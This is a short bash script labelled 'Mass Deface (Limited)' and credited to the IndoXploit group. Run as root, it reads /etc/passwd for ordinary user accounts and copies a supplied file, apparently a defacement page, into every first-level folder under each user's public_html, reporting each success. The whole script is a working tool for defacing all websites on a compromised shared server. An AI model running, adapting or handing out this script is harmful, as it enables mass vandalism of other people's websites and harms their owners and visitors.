#!/bin/bash
args=("$@")
UHOME="/home"
FILE=$(pwd)"/"${args[0]}
priv=$([ $(id -u) == 0 ] && echo " here we go..........." || echo " you must root to run this file :)")

echo " ~~~~~     Mass Deface (Limited)     ~~~~~ "
echo " ~~      Level 1 Subdirs Only       ~~ "
echo " ~    IndoXploit - Sanjungan Jiwa    ~ "
echo "------ [ usage: ./mass file ] ------"
echo ""
echo $priv
echo ""

if [ -z "$1" ]
then
    echo "usage: ./mass file"
    exit 1
fi

if [ $(id -u) != 0 ]; then
    exit 1
fi

_USERS="$(awk -F':' '{ if ( $3 >= 500 ) print $1 }' /etc/passwd)"

for u in $_USERS
do 
    _dir="${UHOME}/${u}/public_html"
    
    if [ -d "$_dir" ]
    then
        find "$_dir" -maxdepth 1 -type d | while read -r target_dir
        do
            /bin/cp "$FILE" "$target_dir/"
            if [ -e "$target_dir/$(basename "$FILE")" ]
            then
                echo "[+] sukses -> $target_dir/$(basename "$FILE")"
            fi
        done
    fi
done
